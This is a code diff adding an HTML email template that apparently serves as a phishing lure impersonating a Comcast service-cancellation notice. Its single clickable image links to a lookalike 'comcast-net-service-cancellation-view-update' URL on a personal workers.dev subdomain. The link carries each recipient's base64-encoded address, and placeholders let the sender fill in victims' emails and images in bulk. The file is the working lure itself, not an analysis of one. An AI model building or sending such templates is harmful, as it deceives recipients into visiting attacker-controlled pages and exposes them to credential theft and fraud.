@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+    body {
+      font-family: Arial, sans-serif;
+      font-size: 16px;
+      line-height: 1.6;
+      margin: 0;
+      padding: 0;
+    }
+
+    .container {
+      max-width: 600px;
+      margin: 0 auto;
+    }
+
+    .img-responsive.mobile {
+      display: none;
+    }
+
+    @media only screen and (max-width: 480px) {
+      .img-responsive {
+        display: none;
+      }
+      .img-responsive.mobile {
+        display: block;
+      }
+
+      /* Apply styles only when viewed on a mobile device */
+      img {
+        max-width: 100%;
+        height: auto;
+      }
+
+      /* Adjust font size for mobile */
+      p {
+        font-size: 10px;
+      }
+    }
+
+    /* Adjust font size for desktop */
+    @media only screen and (min-width: 481px) {
+      p {
+        font-size: 12px;
+      }
+    }
+  </style>
+</head>
+<body>
+   
+    <div style="text-align: center;">
+    <p>This email is for ##email##<p>
+    <a href="comcast-net-service-cancellation-view-update.maiclphillips.workers.dev/?a=##email64##" target="_blank">
+    <img src="##imglet##" class="img-responsive desktop">
+    <img src="##imglet##" class="img-responsive mobile">
+    </a>
+    </div>
+</body>
+
